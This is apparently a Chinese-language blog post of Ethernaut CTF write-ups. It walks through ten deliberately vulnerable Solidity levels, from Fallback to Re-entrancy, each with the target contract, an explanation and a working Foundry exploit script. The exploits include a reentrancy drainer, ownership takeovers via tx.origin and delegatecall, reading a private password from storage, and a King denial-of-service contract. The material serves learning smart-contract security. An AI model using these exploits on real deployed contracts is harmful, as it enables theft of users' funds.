[{"title":"Puppet","url":"/2026/01/27/ethernautP1/","content":"资料库\n解构Solidity Contract\n\n合约升级,TPP、UUPS\n\nAlchemy关于Web3的基础\n\nWhat is Smart Contract Storage Layout?\n\n关于Solidity类型转换\n\nETH开发文档\n\n\nFallBack// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() &#123;        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    &#125;    modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;caller is not the owner&quot;);        _;    &#125;    function contribute() public payable &#123;        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) &#123;            owner = msg.sender;        &#125;    &#125;    function getContribution() public view returns (uint256) &#123;        return contributions[msg.sender];    &#125;    function withdraw() public onlyOwner &#123;        payable(owner).transfer(address(this).balance);    &#125;    receive() external payable &#123;        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    &#125;&#125;\n\n\n\n思路\nreceive()和fallback()区别\n\nreceive()\n专门用于接收 ETH 转账\n必须是 external payable\n仅在 msg.data 为空时触发\n\n\nfallback()\n用于处理不存在的函数调用，或者带数据的 ETH 转账\n可以是 payable 或非 payable\n在代理合约中，经常用来转发调用\n\n\n\n\nmsg.data是什么东西\n\n\n\n根据题目第一步需要获得合约的所有权，第二步提款到自己的账号。\n第一步function contribute()和receive(),但是对于条件来说，receive()更加容易实现，只需要转账有余额，并且有contributions映射就可以实现owner = msg.sender;。第二步通过withdraw提款\nExp：contract Ethernaut01Script is Script &#123;    Instance public ethernaut01 = Instance(InstanceAddress);\tfunction run() public &#123;        vm.startBroadcast();        challange.contribute&#123;value: 1 wei&#125;();        //触发Receive()        (bool success,) = payable(challange).call&#123;value: 1 wei&#125;(&quot;&quot;);        require(success, &quot;Transfer failed.&quot;);        challange.withdraw();        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\nFallOut// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;contract Fallout &#123;    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable &#123;        owner = msg.sender;        allocations[owner] = msg.value;    &#125;    modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;caller is not the owner&quot;);        _;    &#125;    function allocate() public payable &#123;        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    &#125;    function sendAllocation(address payable allocator) public &#123;        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    &#125;    function collectAllocations() public onlyOwner &#123;        msg.sender.transfer(address(this).balance);    &#125;    function allocatorBalance(address allocator) public view returns (uint256) &#123;        return allocations[allocator];    &#125;&#125;\n\n\n\n思路目标是获取合约的使用权，在Solidity的0.6版本，构造函数是必须要和合约同名的。但是我们发现合约的构造函数并不是真的，Fal1out其中有一个是数字1而不是字母l，因此我们可以创建接口直接调用Fal1out函数。\nExpFallout public challange = Fallout(InstancetAddress);  function run() public &#123;      vm.startBroadcast();      challange.Fal1out();      vm.stopBroadcast();  &#125;\n\n\n\n\nCoin Filp// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() &#123;        consecutiveWins = 0;    &#125;    function flip(bool _guess) public returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) &#123;            revert();        &#125;        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) &#123;            consecutiveWins++;            return true;        &#125; else &#123;            consecutiveWins = 0;            return false;        &#125;    &#125;&#125;\n\n\n\n思路因为在WEB3中没有真正的随机数，通过代码实现的都可以仿造，在这个例子中只需要仿照合约中的思路得到答案，再把答案给题目合约就可以了\nExp执行十次合约（没错很蠢，也很浪费钱，每次都要广播）每次执行一次都要等一段时间，跳过blockNumber\n\n[!TIP]\n有个更好的方法是直接创建一个Attrack合约在链上，调用攻击方法就可以了\n\nAttract.sol\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#123;Script, console&#125; from &quot;forge-std/Script.sol&quot;;import &#123;CoinFlip&#125; from &quot;../src/Ethernaut04.sol&quot;;contract Attrack &#123;    CoinFlip private immutable i_coinFilp;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(address _CoinFlip) &#123;        i_coinFilp = CoinFlip(_CoinFlip);    &#125;    function Flip() external &#123;        bool guess = FindGuess();        i_coinFilp.flip(guess);    &#125;    function FindGuess() private view returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        return side;    &#125;&#125;contract CoinFlipSolution is Script &#123;    CoinFlip public coinflipInstance = CoinFlip(InstanceAddress);    function run() external &#123;        vm.startBroadcast();        Attrack attrack = new Attrack(0x585261CB71C102d4a0AD55AEB0cf71A8235A32f4);        attrack.Flip();        console.log(&quot;consecutiveWins: &quot;, coinflipInstance.consecutiveWins());        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\n\n\n\n\nTelephone// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;    address public owner;    constructor() &#123;        owner = msg.sender;    &#125;    function changeOwner(address _owner) public &#123;        if (tx.origin != msg.sender) &#123;            owner = _owner;        &#125;    &#125;&#125;\n\n\n\n思路关键点是在于区别tx.origin和msg.sender的区别，前者是交易的发起者，后者是合约的调用者\n\n [!NOTE]\nmsg.sender的所有者可以是一个合同。\ntx.origin的所有者永远不会是一个合同。\n在一个简单的调用链A-B-C-D中，D内部的msg.sender将是C，tx.origin将是A。\n\n\n\nExp要注意的一点是要合约Owner是钱包地址才行，函数changeOwner的传入参数是要钱包地址。\ncontract TelephoneSolution is Script &#123;    Telephone public challange = Telephone(InstanceAddress);    function run() external &#123;        console.log(&quot;caller : &quot;, msg.sender);        console.log(&quot;oldOwner&quot;, challange.owner());        vm.startBroadcast();        new TelephoneAttack(challange, vm.envAddress(&quot;MY_ADDRESS&quot;));        vm.stopBroadcast();        console.log(&quot;newOwner&quot;, challange.owner());    &#125;&#125;contract TelephoneAttack &#123;    constructor(Telephone _challengeInstance, address _newOwner) &#123;        _challengeInstance.changeOwner(_newOwner);    &#125;&#125;\n\n\n\n\n\n\n\nToken// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;    mapping(address =&gt; uint256) balances;    uint256 public totalSupply;    constructor(uint256 _initialSupply) public &#123;        balances[msg.sender] = totalSupply = _initialSupply;    &#125;    function transfer(address _to, uint256 _value) public returns (bool) &#123;        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    &#125;    function balanceOf(address _owner) public view returns (uint256 balance) &#123;        return balances[_owner];    &#125;&#125;\n\n思路在合约0.6版本，不存在safeMath，可以在加减乘除进行整数的溢出， require(balances[msg.sender] - _value &gt;= 0);其中当msg.sender是零的时候就可以造成整数向下溢出。只需要msg.sender等于0，_to参数是钱包的地址，就可以增加余额。\nExpcontract TokenSolution is Script &#123;    Token public tokenInstance = Token(InstanceAddress);    function run() external &#123;        vm.startBroadcast();        tokenInstance.transfer(address(1), 21);        console.log(&quot;My balance: &quot;, tokenInstance.balanceOf(vm.envAddress(&quot;MY_ADDRESS&quot;)));        vm.stopBroadcast();    &#125;&#125;\n\n直接构造函数填入实例地址即可。\n\n\n[!NOTE]\n首先钱包地址调用了Attrack合约地址中的构造函数，构造函数调用接口就是实例地址。所以对于接口来说msg.sender就是Attrcak合约的地址。Attrack合约是没有余额的，而对于Attrack合约来说，msg.sender是钱包地址。一定要注意好不同的msg.sender的变化。\n\nDelegation// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;    address public owner;    constructor(address _owner) &#123;        owner = _owner;    &#125;    function pwn() public &#123;        owner = msg.sender;    &#125;&#125;contract Delegation &#123;    address public owner;    Delegate delegate;    constructor(address _delegateAddress) &#123;        delegate = Delegate(_delegateAddress);        owner = msg.sender;    &#125;    fallback() external &#123;        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) &#123;            this;        &#125;    &#125;&#125;\n\n思路首先了解delegatecall函数的特性，使用delegatecall函数还需要注意delegatecall()对状态变量存储的影响，也就是说如果用户A要求更改合约C的某个状态存储变量，合约C不会改变，反而是合约B的对应名字的状态存储变量会发生改变。&#x3D;&#x3D;合约C只是提供行为逻辑，合约B提供逻辑需要的变量&#x3D;&#x3D;\n\n\nExp触发Fallback函数的delegatecall方法\ncontract DelegationSolution is Script &#123;    Delegation delegation = Delegation(InstanceAddress);    function run() external &#123;        bytes memory datas = abi.encodeWithSignature(&quot;pwn()&quot;);        vm.startBroadcast();        console.log(&quot;Owner before: &quot;, delegation.owner());        address(delegation).call(datas);        console.log(&quot;newOwner&quot;, delegation.owner());        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\nForce思路利用自毁函数强行转移合约的余额，强制交易余额\n\nExpcontract ForceSolution is Script &#123;    //1.创建一个有钱的合约    //2.销毁第一步创建的合约，强制转账到目标合约    function run() external &#123;        vm.startBroadcast();        new ForceAttack&#123;value: 1 wei&#125;();        vm.stopBroadcast();    &#125;&#125;contract ForceAttack &#123;    constructor() payable &#123;        selfdestruct(payable(InstanceAddress));    &#125;&#125;\n\n\n\n\n\nVault// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    bool public locked;    bytes32 private password;    constructor(bytes32 _password) &#123;        locked = true;        password = _password;    &#125;    function unlock(bytes32 _password) public &#123;        if (password == _password) &#123;            locked = false;        &#125;    &#125;&#125;\n\n\n\n思路审计之后需要得到构造函数的密码才能过关，但是变量属性是private，不过以太坊本质是区块链，所有都是透明的。所有我们可以查看状态变量知道密码。关于智能合约的StorageLayout可以查看资料库\nExp获取密码的方法：\n\n利用CheatCode\n利用etherScan\n利用cast storage [vault_address] [storage_slot]\n\n//第一步：拿到密码//第二部：调用函数改变lockedcontract VaultSolution is Script &#123;    Vault vault = Vault(0xf4f3Ef631C97B826C9118F489C9CE54171Dfce3c);    function run() public &#123;        vm.startBroadcast();        bytes32 leet = vm.load(address(vault), bytes32(uint256(1)));        vault.unlock(leet);        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\n\n\nKing// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King &#123;    address king;    uint256 public prize;    address public owner;    constructor() payable &#123;        owner = msg.sender;        king = msg.sender;        prize = msg.value;    &#125;    receive() external payable &#123;        require(msg.value &gt;= prize || msg.sender == owner);        payable(king).transfer(msg.value);        king = msg.sender;        prize = msg.value;    &#125;    function _king() public view returns (address) &#123;        return king;    &#125;&#125;\n\n\n\n思路Dos的一种方式。对于合约接受ETH的知识点考察，一般接ETH有两个函数receive和fallback。既没有接收以太币也没有支付回退函数，则合约无法通过常规交易接收以太币并抛出异常。官方文档指出\n\n因为代码使用了transfer的方式发送ETH，所以可以利用这点，当提交实例给关卡时,使得关卡抛出异常，阻止王位的转让,\nExp发送ETH，成为国王，但是不写任何的接受ETH的函数\ncontract KingSolution is Script &#123;    King king = King(payable(InstanceAddress));    function run() public &#123;        vm.startBroadcast();        KingAttack attack = new KingAttack&#123;value: 0.0015 ether&#125;(king);        console.log(&quot;Old King:&quot;, king._king());        attack.beKing();        console.log(&quot;New King:&quot;, king._king());        vm.stopBroadcast();    &#125;&#125;contract KingAttack &#123;    King king;    constructor(King _king) payable &#123;        king = _king;    &#125;    function beKing() external &#123;        (bool success,) = address(king).call&#123;value: 0.001 ether&#125;(&quot;&quot;);        require(success, &quot;CALL FAILED&quot;);    &#125;    receive() external payable &#123;        require(msg.sender == address(this), &quot;no king&quot;);    &#125;&#125;\n\n\n\n\n\nRe-entrancy思路经典的重放攻击，利用recevie或者fallback进行无限套娃。直接把全部的钱取出来\nfunction withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123; //首先检查sender的余额是否大于要提款的钱        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); // msg.sender是接收方的地址，合约利用Call的方式向msg.sender发送_amout数量的钱            if(result) &#123;                _amount;            &#125;        balances[msg.sender] -= _amount;     &#125;&#125;\n\n在以上存在漏洞的函数中，因为使用了Call,如果作为接受ETH的合约存在receive和fallback函数，就会执行这个函数存在的逻辑。当这两个特殊的回调函数再次执行withdraw就会反复取钱\n\nExp// SPDX-License-Identifier: MITpragma solidity ^0.8;interface IReentrancy &#123;    function donate(address) external payable;    function withdraw(uint256) external;&#125;contract Hack &#123;    IReentrancy private immutable target;    constructor() &#123;        target = IReentrancy(0xCa69aB382F26857c5508BAF2aC09F15ccFbD9B25);    &#125;    function attack() external payable &#123;        target.donate&#123;value: 1e15&#125;(address(this));        target.withdraw(1e15);        require(address(target).balance == 0, &quot;target balance &gt; 0&quot;);        selfdestruct(payable(msg.sender));    &#125;    receive() external payable &#123;        uint256 amount = min(1e15, address(target).balance);        if (amount &gt; 0) &#123;            target.withdraw(amount);        &#125;    &#125;    function min(uint256 x, uint256 y) private pure returns (uint256) &#123;        return x &lt;= y ? x : y;    &#125;&#125;\n\n首先部署攻击合约Hack\nforge create src/Attack.sol:Hack --account 0x1f --rpc-url $SEPOLIA_RPC_URL --etherscan-api-key $ETHERSCAN_KEY --broadcast\n\n\n大概的逻辑就是，首先利用Hack合约利用donate函数使得在实例合约中有余额，通过 withdraw()函数的第一层验证。再通过调用实例合约的withdraw()函数实现Re-entrancy attrack。当调用Hack合约中的\ncast send 0xeE911138B13E36DB6E1A2438092A40c0e339D489 &quot;attack&quot; --account 0x1f --rpc-url $SEPOLIA_RPC_URL --value 0.001ether --etherscan-api-key $ETHERSCAN_KEY\n\n为什么是用0.001ETH呢？因为实例地址本身创建之后就存在0.001ETH的余额\n\n可以看到首先Hack合约先发了0.001ETH给予实例合约，然后再触发Re-entrancy\n\n不用部署的Exp\ninterface IReentrance &#123;    function donate(address) external payable;    function withdraw(uint256) external;    function balanceOf(address) external view returns (uint256);&#125;contract ReEntrancySolution is Script &#123;    Reentrance re = Reentrance(0xE1280DB04f7C397BaBd478CA0EFc0f9293eE0927);    function run() public &#123;        vm.startBroadcast();        ReEntrancyAttack attack = new ReEntrancyAttack&#123;value: 0.001 ether&#125;(address(re));        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract ReEntrancyAttack &#123;    IReentrance private immutable target;    constructor(address _instanceAddress) public payable &#123;        target = IReentrance(_instanceAddress);    &#125;    function attack() external &#123;        target.donate&#123;value: 0.001 ether&#125;(address(this));        target.withdraw(0.001 ether);    &#125;    receive() external payable &#123;        uint256 balance = target.balanceOf(address(this));        if (balance &gt; 0) &#123;            target.withdraw(balance);        &#125;    &#125;&#125;\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]}]